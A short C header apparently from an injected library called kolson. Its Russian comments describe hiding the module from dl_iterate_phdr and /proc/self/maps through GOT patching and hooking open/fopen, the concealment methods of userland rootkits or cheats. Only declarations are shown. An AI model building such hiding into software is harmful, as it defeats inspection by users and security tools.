#ifndef KOLSON_STEALTH_H
#define KOLSON_STEALTH_H
/* спрятать наш модуль от dl_iterate_phdr и /proc/self/maps;
   возвращает число подменённых GOT-записей (0 - нечего было прятать) */
int kolson_stealth_install(void);
int kolson_stealth_installed(void);
/* сколько раз наш маркер встречается в СЫРЫХ maps (то, что прячет обёртка) */
int kolson_stealth_selftest(void);
/* RTLD_GLOBAL-промоушен себя: импорты загруженной после нас libkolson
   связываются с нашими open/fopen/dl_iterate_phdr */
int kolson_stealth_promote(void);
#endif
